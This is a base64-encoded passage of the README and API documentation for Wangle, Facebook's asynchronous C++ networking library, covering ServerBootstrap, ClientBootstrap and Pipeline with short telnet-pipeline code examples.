ZQpjdGVzdApzdWRvIG1ha2UgaW5zdGFsbApgYGAKCiMjIFR1dG9yaWFsCgpU
aGVyZSBpcyBhIHR1dG9yaWFsIFtoZXJlXSh0dXRvcmlhbC5tZCkgdGhhdCBl
eHBsYWlucyB0aGUgYmFzaWNzIG9mIFdhbmdsZSBhbmQgc2hvd3MgaG93IHRv
IGJ1aWxkIGFuIGVjaG8gc2VydmVyL2NsaWVudC4KCiMjIEV4YW1wbGVzCgpT
ZWUgdGhlIGV4YW1wbGVzLyBkaXJlY3RvcnkgZm9yIHNvbWUgZXhhbXBsZSBX
YW5nbGUgc2VydmVycyBhbmQgY2xpZW50cwoKIyMgTGljZW5zZQpXYW5nbGUg
aXMgQXBhY2hlIDIuMC1saWNlbnNlZC4KCiMjIENvbnRyaWJ1dGluZwpTZWUg
dGhlIENPTlRSSUJVVElORyBmaWxlIGZvciBob3cgdG8gaGVscCBvdXQuCgoj
IyBEb2N1bWVudGF0aW9uCgo8cD5XYW5nbGUgaW50ZXJmYWNlcyBhcmUgYXN5
bmNocm9ub3VzLiAgSW50ZXJmYWNlcyBhcmUgY3VycmVudGx5IGJhc2VkIG9u
IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9mYWNlYm9vay9mb2xseS90
cmVlL21hc3Rlci9mb2xseS9mdXR1cmVzIj5GdXR1cmVzPC9hPiwgYnV0IHdl
JiMwMzk7cmUgYWxzbyBleHBsb3JpbmcgaG93IHRvIHN1cHBvcnQgZmliZXJz
PC9wPgoKPGgyIGlkPSJjbGllbnQtc2VydmVyLWFic3RyYWN0aW8iPkNsaWVu
dCAvIFNlcnZlciBhYnN0cmFjdGlvbiA8YSBocmVmPSIjY2xpZW50LXNlcnZl
ci1hYnN0cmFjdGlvIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gyPgoK
PHA+WW91JiMwMzk7cmUgcHJvYmFibHkgZmFtaWxpYXIgd2l0aCBKYXZhJiMw
Mzk7cyBOZXR0eSwgb3IgUHl0aG9uJiMwMzk7cyB0d2lzdGVkLCBvciBzaW1p
bGFyIGxpYnJhcmllcy48L3A+Cgo8cD5JdCBpcyBidWlsdCBvbiB0b3Agb2Yg
Zm9sbHkvYXN5bmMvaW8sIHNvIGl0JiMwMzk7cyBvbmUgbGV2ZWwgdXAgdGhl
IHN0YWNrIGZyb20gdGhhdCAob3Igc2ltaWxhciBhYnN0cmFjdGlvbnMgbGlr
ZSBib29zdDo6YXNpbyk8L3A+Cgo8cD5TZXJ2ZXJCb290c3RyYXAgLSBlYXNp
bHkgbWFuYWdlIGNyZWF0aW9uIG9mIHRocmVhZHBvb2xzIGFuZCBwaXBlbGlu
ZXM8L3A+Cgo8cD5DbGllbnRCb290c3RyYXAgLSB0aGUgc2FtZSBmb3IgY2xp
ZW50czwvcD4KCjxwPlBpcGVsaW5lIC0gc2V0IHVwIGEgc2VyaWVzIG9mIGhh
bmRsZXJzIHRoYXQgbW9kaWZ5IHlvdXIgc29ja2V0IGRhdGE8L3A+Cgo8aDIg
aWQ9InJlcXVlc3QtcmVzcG9uc2UtYWJzdHJhYyI+UmVxdWVzdCAvIFJlc3Bv
bnNlIGFic3RyYWN0aW9uIDxhIGhyZWY9IiNyZXF1ZXN0LXJlc3BvbnNlLWFi
c3RyYWMiIGNsYXNzPSJoZWFkZXJMaW5rIj4jPC9hPjwvaDI+Cgo8cD5UaGlz
IGlzIHJvdWdobHkgZXF1aXZhbGVudCB0byB0aGUgPGEgaHJlZj0iaHR0cHM6
Ly90d2l0dGVyLmdpdGh1Yi5pby9maW5hZ2xlLyIgdGFyZ2V0PSJfYmxhbmsi
PkZpbmFnbGU8L2E+IGxpYnJhcnkuPC9wPgoKPHA+QWltcyB0byBwcm92aWRl
IGVhc3kgdGVzdGluZywgbG9hZCBiYWxhbmNpbmcsIGNsaWVudCBwb29saW5n
LCByZXRyeSBsb2dpYywgZXRjLiAgZm9yIGFueSByZXF1ZXN0L3Jlc3BvbnNl
IHR5cGUgc2VydmljZSAtIGkuZS4gdGhyaWZ0LCBodHRwLCBldGMuPC9wPgoK
PHA+U2VydmljZSAtIGEgbWF0Y2hlZCBpbnRlcmZhY2UgYmV0d2VlbiBjbGll
bnQvc2VydmVyLiAgQSBzZXJ2ZXIgd2lsbCBpbXBsZW1lbnQgdGhpcyBpbnRl
cmZhY2UsIGFuZCBhIGNsaWVudCB3aWxsIGNhbGwgaW4gdG8gaXQuICBUaGVz
ZSBhcmUgcHJvdG9jb2wtc3BlY2lmaWM8L3A+Cgo8cD5TZXJ2aWNlRmlsdGVy
IC0gYSBnZW5lcmljIGZpbHRlciBvbiBhIHNlcnZpY2UuIEV4YW1wbGVzOiBz
dGF0cywgcmVxdWVzdCB0aW1lb3V0cywgcmF0ZSBsaW1pdGluZzwvcD4KCjxw
PlNlcnZpY2VGYWN0b3J5IC0gQSBmYWN0b3J5IHRoYXQgY3JlYXRlcyBjbGll
bnQgY29ubmVjdGlvbnMuICBBbnkgcHJvdG9jb2wgc3BlY2lmaWMgc2V0dXAg
Y29kZSBnb2VzIGhlcmU8L3A+Cgo8cD5TZXJ2aWNlRmFjdG9yeUZpbHRlciAt
IEdlbmVyaWMgZmlsdGVycyB0aGF0IGNvbnRyb2wgaG93IGNvbm5lY3Rpb25z
IGFyZSBjcmVhdGVkLiAgQ2xpZW50IGV4YW1wbGVzOiBsb2FkIGJhbGFuY2lu
ZywgcG9vbGluZywgIGlkbGUgdGltZW91dHMsIG1hcmtkb3ducywgZXRjLjwv
cD48L3NlY3Rpb24+PHNlY3Rpb24gY2xhc3M9ImRleF9kb2N1bWVudCI+PGgx
PlNlcnZlckJvb3RzdHJhcDwvaDE+PHAgY2xhc3M9ImRleF9pbnRyb2R1Y3Rp
b24iPkVhc2lseSBjcmVhdGUgYSBuZXcgc2VydmVyPC9wPjxwPlNlcnZlckJv
b3RzdHJhcCBkb2VzIHRoZSB3b3JrIHRvIHNldCB1cCBvbmUgb3IgbXVsdGlw
bGUgYWNjZXB0b3IgdGhyZWFkcywgYW5kIG9uZSBvciBtdWx0aXBsZSBzZXRz
IG9mIElPIHRocmVhZHMuICBUaGUgdGhyZWFkIHBvb2xzIGNhbiBiZSB0aGUg
c2FtZS4gIFNPX1JFVVNFUE9SVCBpcyBhdXRvbWF0aWNhbGx5IHN1cHBvcnRl
ZCBmb3IgbXVsdGlwbGUgYWNjZXB0IHRocmVhZHMuIHRjcCBpcyBtb3N0IGNv
bW1vbiwgYWx0aG91Z2ggdWRwIGlzIGFsc28gc3VwcG9ydGVkLjwvcD4KCjxo
MiBpZD0ibWV0aG9kcyI+TWV0aG9kcyA8YSBocmVmPSIjbWV0aG9kcyIgY2xh
c3M9ImhlYWRlckxpbmsiPiM8L2E+PC9oMj4KCjxwPjxzdHJvbmc+Y2hpbGRQ
aXBlbGluZShQaXBlbGluZUZhY3RvcnkmbHQ7UGlwZWxpbmUmZ3Q7KTwvc3Ry
b25nPjwvcD4KCjxwPlNldHMgdGhlIHBpcGVsaW5lIGZhY3RvcnkgZm9yIGVh
Y2ggbmV3IGNvbm5lY3Rpb24uICBPbmUgcGlwZWxpbmUgcGVyIGNvbm5lY3Rp
b24gd2lsbCBiZSBjcmVhdGVkLjwvcD4KCjxwPjxzdHJvbmc+Z3JvdXAoSU9U
aHJlYWRQb29sRXhlY3V0b3IgYWNjZXB0LCBJT1RocmVhZFBvb2xFeGVjdXRv
ciBpbyk8L3N0cm9uZz48L3A+Cgo8cD5TZXRzIHRoZSB0aHJlYWQgcG9vbHMg
Zm9yIGFjY2VwdCBhbmQgaW8gdGhyZWFkIHBvb2xzLiAgSWYgbW9yZSB0aGFu
IG9uZSB0aHJlYWQgaXMgaW4gdGhlIGFjY2VwdCBncm91cCwgU09fUkVVU0VQ
T1JUIGlzIHVzZWQuICBEZWZhdWx0cyB0byBhIHNpbmdsZSBhY2NlcHQgdGhy
ZWFkLCBhbmQgb25lIGlvIHRocmVhZCBwZXIgY29yZS48L3A+Cgo8cD48c3Ry
b25nPmJpbmQoU29ja2V0QWRkcmVzcyksYmluZChwb3J0KTwvc3Ryb25nPjwv
cD4KCjxwPkJpbmRzIHRvIGEgcG9ydC4gQXV0b21hdGljYWxseSBzdGFydHMg
dG8gYWNjZXB0IGFmdGVyIGJpbmQuPC9wPgoKPHA+PHN0cm9uZz5zdG9wKCk8
L3N0cm9uZz48L3A+Cgo8cD5TdG9wcyBsaXN0ZW5pbmcgb24gYWxsIHNvY2tl
dHMuPC9wPgoKPHA+PHN0cm9uZz5qb2luKCk8L3N0cm9uZz48L3A+Cgo8cD5K
b2lucyBhbGwgdGhyZWFkcG9vbHMgLSBhbGwgY3VycmVudCByZWFkcyBhbmQg
d3JpdGVzIHdpbGwgYmUgY29tcGxldGVkIGJlZm9yZSB0aGlzIG1ldGhvZCBy
ZXR1cm5zLjwvcD4KCjxkaXYgY2xhc3M9InJlbWFya3VwLW5vdGUiPjxzcGFu
IGNsYXNzPSJyZW1hcmt1cC1ub3RlLXdvcmQiPk5PVEU6PC9zcGFuPiBob3dl
dmVyIHRoYXQgYm90aCBhY2NlcHQgYW5kIGlvIHRocmVhZCBwb29scyB3aWxs
IGJlIHN0b3BwZWQgdXNpbmcgdGhpcyBtZXRob2QsIHNvIHRoZSB0aHJlYWQg
cG9vbHMgY2FuJiMwMzk7dCBiZSBzaGFyZWQsIG9yIGNhcmUgbXVzdCBiZSB0
YWtlbiB1c2luZyBzaGFyZWQgcG9vbHMgZHVyaW5nIHNodXRkb3duLjwvZGl2
PgoKPHA+PHN0cm9uZz53YWl0Rm9yU3RvcCgpPC9zdHJvbmc+PC9wPgoKPHA+
V2FpdHMgZm9yIHN0b3AoKSB0byBiZSBjYWxsZWQgZnJvbSBhbm90aGVyIHRo
cmVhZC48L3A+Cgo8aDIgaWQ9Im90aGVyLW1ldGhvZHMiPk90aGVyIG1ldGhv
ZHMgPGEgaHJlZj0iI290aGVyLW1ldGhvZHMiIGNsYXNzPSJoZWFkZXJMaW5r
Ij4jPC9hPjwvaDI+Cgo8cD48c3Ryb25nPmNoYW5uZWxGYWN0b3J5KFNlcnZl
clNvY2tldEZhY3RvcnkpPC9zdHJvbmc+PC9wPgoKPHA+U2V0cyB1cCB0aGUg
dHlwZSBvZiBzZXJ2ZXIuICBEZWZhdWx0cyB0byBUQ1AgQXN5bmNTZXJ2ZXJT
b2NrZXQsIGJ1dCBBc3luY1VEUFNlcnZlclNvY2tldCBpcyBhbHNvIHN1cHBv
cnRlZCB0byByZWNlaXZlIHVkcCBtZXNzYWdlcy4gIEluIHByYWN0aWNlLCBT
ZXJ2ZXJCb290c3RyYXAgaXMgb25seSB1c2VmdWwgZm9yIHVkcCBpZiB5b3Ug
bmVlZCB0byBtdWx0aXBsZXggdGhlIG1lc3NhZ2VzIGFjcm9zcyBtYW55IHRo
cmVhZHMsIG9yIGhhdmUgVENQIGNvbm5lY3Rpb25zIGdvaW5nIG9uIGF0IHRo
ZSBzYW1lIHRpbWUsIGV0Yy4gIFNpbXBsZSB1c2FnZXMgb2YgQXN5bmNVRFBT
b2NrZXQgcHJvYmFibHkgZG9uJiMwMzk7dCBuZWVkIHRoZSBjb21wbGV4aXR5
IG9mIFNlcnZlckJvb3RzdHJhcC48L3A+Cgo8cD48c3Ryb25nPnBpcGVsaW5l
KFBpcGVsaW5lRmFjdG9yeSZsdDtBY2NlcHRQaXBlbGluZSZndDspPC9zdHJv
bmc+PC9wPgoKPHA+VGhpcyBwaXBlbGluZSBtZXRob2QgaXMgdXNlZCB0byBn
ZXQgdGhlIGFjY2VwdGVkIHNvY2tldCAob3IgdWRwIG1lc3NhZ2UpICpiZWZv
cmUqIGl0IGhhcyBiZWVuIGhhbmRlZCBvZmYgdG8gYW4gSU8gdGhyZWFkLiAg
VGhpcyBjYW4gYmUgdXNlZCB0byBzdGVlciB0aGUgYWNjZXB0IHRocmVhZCB0
byBhIHBhcnRpY3VsYXIgdGhyZWFkLCBvciBmb3IgbG9nZ2luZy48L3A+Cgo8
cD5TZWUgYWxzbyBBY2NlcHRSb3V0aW5nSGFuZGxlciBhbmQgUm91dGluZ0Rh
dGFIYW5kbGVyIGZvciBhZGRpdGlvbmFsIGhlbHAgaW4gcmVhZGluZyBkYXRh
IG9mZiBvZiB0aGUgYWNjZXB0ZWQgc29ja2V0IDxzdHJvbmc+YmVmb3JlPC9z
dHJvbmc+IGl0IGdldHMgYXR0YWNoZWQgdG8gYW4gSU8gdGhyZWFkLiAgVGhl
c2UgY2FuIGJlIHVzZWQgdG8gaGFzaCBpbmNvbWluZyBzb2NrZXRzIHRvIHNw
ZWNpZmljIHRocmVhZHMuPC9wPgoKPHA+PHN0cm9uZz5jaGlsZEhhbmRsZXIo
QWNjZXB0b3JGYWN0b3J5KTwvc3Ryb25nPjwvcD4KCjxwPlByZXZpb3VzbHkg
ZmFjZWJvb2sgaGFkIGxvdHMgb2YgY29kZSB0aGF0IHVzZWQgQWNjZXB0b3JG
YWN0b3JpZXMgaW5zdGVhZCBvZiBQaXBlbGluZXMsIHRoaXMgaXMgYSBtZXRo
b2QgdG8gc3VwcG9ydCB0aGlzIGNvZGUgYW5kIGJlIGJhY2t3YXJkcyBjb21w
YXRpYmxlLiAgVGhlIEFjY2VwdG9yRmFjdG9yeSBpcyByZXNwb25zaWJsZSBm
b3IgY3JlYXRpbmcgYWNjZXB0b3JzLCBzZXR0aW5nIHVwIHBpcGVsaW5lcywg
c2V0dGluZyB1cCBBc3luY1NvY2tldCByZWFkIGNhbGxiYWNrcywgZXRjLjwv
cD4KCjxoMiBpZD0iZXhhbXBsZXMiPkV4YW1wbGVzIDxhIGhyZWY9IiNleGFt
cGxlcyIgY2xhc3M9ImhlYWRlckxpbmsiPiM8L2E+PC9oMj4KCjxwPkEgc2lt
cGxlIGV4YW1wbGU6PC9wPgoKPGRpdiBjbGFzcz0icmVtYXJrdXAtY29kZS1i
bG9jayIgZGF0YS1jb2RlLWxhbmc9InBocCI+PHByZSBjbGFzcz0icmVtYXJr
dXAtY29kZSI+PHNwYW4gY2xhc3M9Im5vIj5TZXJ2ZXJCb290c3RyYXA8L3Nw
YW4+PHNwYW4gY2xhc3M9Im8iPiZsdDs8L3NwYW4+PHNwYW4gY2xhc3M9Im5v
Ij5UZWxuZXRQaXBlbGluZTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+Jmd0Ozwv
c3Bhbj4gPHNwYW4gY2xhc3M9Im5vIj5zZXJ2ZXI8L3NwYW4+PHNwYW4gY2xh
c3M9Im8iPjs8L3NwYW4+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgCjxzcGFuIGNsYXNzPSJubyI+
c2VydmVyPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4uPC9zcGFuPjxzcGFuIGNs
YXNzPSJuZiIgZGF0YS1zeW1ib2wtbmFtZT0iY2hpbGRQaXBlbGluZSI+Y2hp
bGRQaXBlbGluZTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3Bh
biBjbGFzcz0ibmMiIGRhdGEtc3ltYm9sLW5hbWU9InN0ZCI+c3RkPC9zcGFu
PjxzcGFuIGNsYXNzPSJvIj46Ojwvc3Bhbj48c3BhbiBjbGFzcz0ibmEiIGRh
dGEtc3ltYm9sLWNvbnRleHQ9InN0ZCIgZGF0YS1zeW1ib2wtbmFtZT0ibWFr
ZV9zaGFyZWQiPm1ha2Vfc2hhcmVkPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4m
bHQ7PC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+VGVsbmV0UGlwZWxpbmVGYWN0
b3J5PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mZ3Q7KCkpOzwvc3Bhbj4gICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8c3BhbiBjbGFzcz0ibm8i
PnNlcnZlcjwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+Ljwvc3Bhbj48c3BhbiBj
bGFzcz0ibmYiIGRhdGEtc3ltYm9sLW5hbWU9ImJpbmQiPmJpbmQ8L3NwYW4+
PHNwYW4gY2xhc3M9Im8iPig8L3NwYW4+PHNwYW4gY2xhc3M9Im5vIj5GTEFH
U19wb3J0PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4pOzwvc3Bhbj4gICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAKPHNwYW4gY2xhc3M9Im5vIj5zZXJ2ZXI8
L3NwYW4+PHNwYW4gY2xhc3M9Im8iPi48L3NwYW4+PHNwYW4gY2xhc3M9Im5m
IiBkYXRhLXN5bWJvbC1uYW1lPSJ3YWl0Rm9yU3RvcCI+d2FpdEZvclN0b3A8
L3NwYW4+PHNwYW4gY2xhc3M9Im8iPigpOzwvc3Bhbj48L3ByZT48L2Rpdj48
L3NlY3Rpb24+PHNlY3Rpb24gY2xhc3M9ImRleF9kb2N1bWVudCI+PGgxPkNs
aWVudEJvb3RzdHJhcDwvaDE+PHAgY2xhc3M9ImRleF9pbnRyb2R1Y3Rpb24i
PkNyZWF0ZSBjbGllbnRzIGVhc2lseTwvcD48cD5DbGllbnRCb290c3RyYXAg
aXMgYSB0aGluIHdyYXBwZXIgYXJvdW5kIEFzeW5jU29ja2V0IHRoYXQgcHJv
dmlkZXMgYSBmdXR1cmUgaW50ZXJmYWNlIHRvIHRoZSBjb25uZWN0IGNhbGxi
YWNrLCBhbmQgYSBQaXBlbGluZSBpbnRlcmZhY2UgdG8gdGhlIHJlYWQgY2Fs
bGJhY2suPC9wPgoKPGgyIGlkPSJtZXRob2RzIj5NZXRob2RzIDxhIGhyZWY9
IiNtZXRob2RzIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gyPgoKPHA+
PHN0cm9uZz5ncm91cChJT1RocmVhZFBvb2xFeGVjdXRvcik8L3N0cm9uZz48
L3A+Cgo8cD5TZXRzIHRoZSB0aHJlYWQgb3IgZ3JvdXAgb2YgdGhyZWFkcyB3
aGVyZSB0aGUgSU8gd2lsbCB0YWtlIHBsYWNlLiAgQ2FsbGJhY2tzIGFyZSBh
bHNvIG1hZGUgb24gdGhpcyB0aHJlYWQuPC9wPgoKPHA+PHN0cm9uZz5iaW5k
KHBvcnQpPC9zdHJvbmc+PC9wPgoKPHA+T3B0aW9uYWxseSBiaW5kIHRvIGEg
c3BlY2lmaWMgcG9ydDwvcD4KCjxwPjxzdHJvbmc+RnV0dXJlJmx0O1BpcGVs
aW5lKiZndDsgY29ubmVjdChTb2NrZXRBZGRyZXNzKTwvc3Ryb25nPjwvcD4K
CjxwPkNvbm5lY3QgdG8gdGhlIHNlbGVjdGVkIGFkZHJlc3MuICBXaGVuIHRo
ZSBmdXR1cmUgaXMgY29tcGxldGUsIHRoZSBpbml0aWFsaXplZCBwaXBlbGlu
ZSB3aWxsIGJlIHJldHVybmVkLjwvcD4KCjxkaXYgY2xhc3M9InJlbWFya3Vw
LW5vdGUiPjxzcGFuIGNsYXNzPSJyZW1hcmt1cC1ub3RlLXdvcmQiPk5PVEU6
PC9zcGFuPiBmdXR1cmUuY2FuY2VsKCkgY2FuIGJlIGNhbGxlZCB0byBjYW5j
ZWwgYW4gb3V0c3RhbmRpbmcgY29ubmVjdGlvbiBhdHRlbXB0LjwvZGl2PgoK
PHA+PHN0cm9uZz5waXBlbGluZUZhY3RvcnkoUGlwZWxpbmVGYWN0b3J5Jmx0
O1BpcGVsaW5lJmd0Oyk8L3N0cm9uZz48L3A+Cgo8cD5TZXQgdGhlIHBpcGVs
aW5lIGZhY3RvcnkgdG8gdXNlIGFmdGVyIGEgY29ubmVjdGlvbiBpcyBzdWNj
ZXNzZnVsLjwvcD4KCjxoMiBpZD0iZXhhbXBsZSI+RXhhbXBsZSA8YSBocmVm
PSIjZXhhbXBsZSIgY2xhc3M9ImhlYWRlckxpbmsiPiM8L2E+PC9oMj4KCjxk
aXYgY2xhc3M9InJlbWFya3VwLWNvZGUtYmxvY2siIGRhdGEtY29kZS1sYW5n
PSJwaHAiPjxwcmUgY2xhc3M9InJlbWFya3VwLWNvZGUiPjxzcGFuIGNsYXNz
PSJubyI+Q2xpZW50Qm9vdHN0cmFwPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4m
bHQ7PC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+VGVsbmV0UGlwZWxpbmU8L3Nw
YW4+PHNwYW4gY2xhc3M9Im8iPiZndDs8L3NwYW4+IDxzcGFuIGNsYXNzPSJu
byI+Y2xpZW50PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj47PC9zcGFuPgo8c3Bh
biBjbGFzcz0ibm8iPmNsaWVudDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+Ljwv
c3Bhbj48c3BhbiBjbGFzcz0ibmYiIGRhdGEtc3ltYm9sLW5hbWU9Imdyb3Vw
Ij5ncm91cDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3BhbiBj
bGFzcz0ibmMiIGRhdGEtc3ltYm9sLW5hbWU9InN0ZCI+c3RkPC9zcGFuPjxz
cGFuIGNsYXNzPSJvIj46Ojwvc3Bhbj48c3BhbiBjbGFzcz0ibmEiIGRhdGEt
c3ltYm9sLWNvbnRleHQ9InN0ZCIgZGF0YS1zeW1ib2wtbmFtZT0ibWFrZV9z
aGFyZWQiPm1ha2Vfc2hhcmVkPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mbHQ7
PC9zcGFuPjxzcGFuIGNsYXNzPSJuYyIgZGF0YS1zeW1ib2wtbmFtZT0iZm9s
bHkiPmZvbGx5PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj46Ojwvc3Bhbj48c3Bh
biBjbGFzcz0ibmEiIGRhdGEtc3ltYm9sLWNvbnRleHQ9ImZvbGx5IiBkYXRh
LXN5bWJvbC1uYW1lPSJ3YW5nbGUiPndhbmdsZTwvc3Bhbj48c3BhbiBjbGFz
cz0ibyI+Ojo8L3NwYW4+PHNwYW4gY2xhc3M9Im5hIiBkYXRhLXN5bWJvbC1u
YW1lPSJJT1RocmVhZFBvb2xFeGVjdXRvciI+SU9UaHJlYWRQb29sRXhlY3V0
b3I8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPiZndDsoPC9zcGFuPjxzcGFuIGNs
YXNzPSJtaSI+MTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KSk7PC9zcGFuPgo8
c3BhbiBjbGFzcz0ibm8iPmNsaWVudDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+
Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibmYiIGRhdGEtc3ltYm9sLW5hbWU9InBp
cGVsaW5lRmFjdG9yeSI+cGlwZWxpbmVGYWN0b3J5PC9zcGFuPjxzcGFuIGNs
YXNzPSJvIj4oPC9zcGFuPjxzcGFuIGNsYXNzPSJuYyIgZGF0YS1zeW1ib2wt
bmFtZT0ic3RkIj5zdGQ8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPjo6PC9zcGFu
PjxzcGFuIGNsYXNzPSJuYSIgZGF0YS1zeW1ib2wtY29udGV4dD0ic3RkIiBk
YXRhLXN5bWJvbC1uYW1lPSJtYWtlX3NoYXJlZCI+bWFrZV9zaGFyZWQ8L3Nw
YW4+PHNwYW4gY2xhc3M9Im8iPiZsdDs8L3NwYW4+PHNwYW4gY2xhc3M9Im5v
Ij5UZWxuZXRQaXBlbGluZUZhY3Rvcnk8L3NwYW4+PHNwYW4gY2xhc3M9Im8i
PiZndDsoKSk7PC9zcGFuPgo8c3BhbiBjbGFzcz0iYyI+Ly8gc3luY2hyb25v
dXNseSB3YWl0IGZvciB0aGUgY29ubmVjdCB0byBmaW5pc2g8L3NwYW4+Cjxz
cGFuIGNsYXNzPSJubyI+YXV0bzwvc3Bhbj4gPHNwYW4gY2xhc3M9Im5vIj5w
aXBlbGluZTwvc3Bhbj4gPHNwYW4gY2xhc3M9Im8iPj08L3NwYW4+IDxzcGFu
IGNsYXNzPSJubyI+Y2xpZW50PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4uPC9z
cGFuPjxzcGFuIGNsYXNzPSJuZiIgZGF0YS1zeW1ib2wtbmFtZT0iY29ubmVj
dCI+Y29ubmVjdDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3Bh
biBjbGFzcz0ibmYiIGRhdGEtc3ltYm9sLW5hbWU9IlNvY2tldEFkZHJlc3Mi
PlNvY2tldEFkZHJlc3M8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPig8L3NwYW4+
PHNwYW4gY2xhc3M9Im5vIj5GTEFHU19ob3N0PC9zcGFuPjxzcGFuIGNsYXNz
PSJvIj4sPC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+RkxBR1NfcG9ydDwvc3Bh
bj48c3BhbiBjbGFzcz0ibyI+KSkuPC9zcGFuPjxzcGFuIGNsYXNzPSJuZiIg
ZGF0YS1zeW1ib2wtbmFtZT0iZ2V0Ij5nZXQ8L3NwYW4+PHNwYW4gY2xhc3M9
Im8iPigpOzwvc3Bhbj4KCjxzcGFuIGNsYXNzPSJjIj4vLyBjbG9zZSB0aGUg
cGlwZWxpbmUgd2hlbiBmaW5pc2hlZDwvc3Bhbj4KPHNwYW4gY2xhc3M9Im5v
Ij5waXBlbGluZTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+LSZndDs8L3NwYW4+
PHNwYW4gY2xhc3M9Im5hIiBkYXRhLXN5bWJvbC1uYW1lPSJjbG9zZSI+Y2xv
c2U8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPigpOzwvc3Bhbj48L3ByZT48L2Rp
dj48L3NlY3Rpb24+PHNlY3Rpb24gY2xhc3M9ImRleF9kb2N1bWVudCI+PGgx
PlBpcGVsaW5lPC9oMT48cCBjbGFzcz0iZGV4X2ludHJvZHVjdGlvbiI+U2Vu
ZCB5b3VyIHNvY2tldCBkYXRhIHRocm91Z2ggYSBzZXJpZXMgb2YgdHViZXM8
L3A+PHA+QSBQaXBlbGluZSBpcyBhIHNlcmllcyBvZiBIYW5kbGVycyB0aGF0
IGludGVyY2VwdCBpbmJvdW5kIG9yIG91dGJvdW5kIGV2ZW50cywgZ2l2aW5n
IGZ1bGwgY29udHJvbCBvdmVyIGhvdyBldmVudHMgYXJlIGhhbmRsZWQuICBI
YW5kbGVycyBjYW4gYmUgYWRkZWQgZHluYW1pY2FsbHkgdG8gdGhlIHBpcGVs
aW5lLjwvcD4KCjxwPldoZW4gZXZlbnRzIGFyZSBjYWxsZWQsIGEgQ29udGV4
dCogb2JqZWN0IGlzIHBhc3NlZCB0byB0aGUgSGFuZGxlciAtIHRoaXMgbWVh
bnMgc3RhdGUgY2FuIGJlIHN0b3JlZCBpbiB0aGUgY29udGV4dCBvYmplY3Qs
IGFuZCBhIHNpbmdsZSBpbnN0YW50aWF0aW9uIG9mIGFueSBpbmRpdmlkdWFs
IEhhbmRsZXIgY2FuIGJlIHVzZWQgZm9yIHRoZSBlbnRpcmUgcHJvZ3JhbS48
L3A+Cgo8cD5OZXR0eSYjMDM5O3MgZG9jdW1lbnRhdGlvbjogPGEgaHJlZj0i
aHR0cDovL25ldHR5LmlvLzQuMC9hcGkvaW8vbmV0dHkvY2hhbm5lbC9DaGFu
bmVsUGlwZWxpbmUuaHRtbCIgdGFyZ2V0PSJfYmxhbmsiPkNoYW5uZWxIYW5k
bGVyPC9hPjwvcD4KCjxwPlVzdWFsbHksIHRoZSBib3R0b20gb2YgdGhlIFBp
cGVsaW5lIGlzIGEgd2FuZ2xlOjpBc3luY1NvY2tldEhhbmRsZXIgdG8gcmVh
ZC93cml0ZSB0byBhIHNvY2tldCwgYnV0IHRoaXMgaXNuJiMwMzk7dCBhIHJl
cXVpcmVtZW50LjwvcD4KCjxwPkEgcGlwZWxpbmUgaXMgdGVtcGxhdGVkIG9u
IHRoZSBpbnB1dCBhbmQgb3V0cHV0IHR5cGVzOjwvcD4KCjxkaXYgY2xhc3M9
InJlbWFya3VwLWNvZGUtYmxvY2siIGRhdGEtY29kZS1sYW5nPSJwaHAiPjxw
cmUgY2xhc3M9InJlbWFya3VwLWNvZGUiPjxzcGFuIGNsYXNzPSJubyI+RXZl
bnRCYXNlPC9zcGFuPiA8c3BhbiBjbGFzcz0ibm8iPmJhc2VfPC9zcGFuPjxz
cGFuIGNsYXNzPSJvIj47PC9zcGFuPgo8c3BhbiBjbGFzcz0ibm8iPlBpcGVs
aW5lPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mbHQ7PC9zcGFuPjxzcGFuIGNs
YXNzPSJubyI+SU9CdWZRdWV1ZTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+JmFt
cDssPC9zcGFuPiA8c3BhbiBjbGFzcz0ibmMiIGRhdGEtc3ltYm9sLW5hbWU9
InN0ZCI+c3RkPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj46Ojwvc3Bhbj48c3Bh
biBjbGFzcz0ibmEiIGRhdGEtc3ltYm9sLWNvbnRleHQ9InN0ZCIgZGF0YS1z
eW1ib2wtbmFtZT0idW5pcXVlX3B0ciI+dW5pcXVlX3B0cjwvc3Bhbj48c3Bh
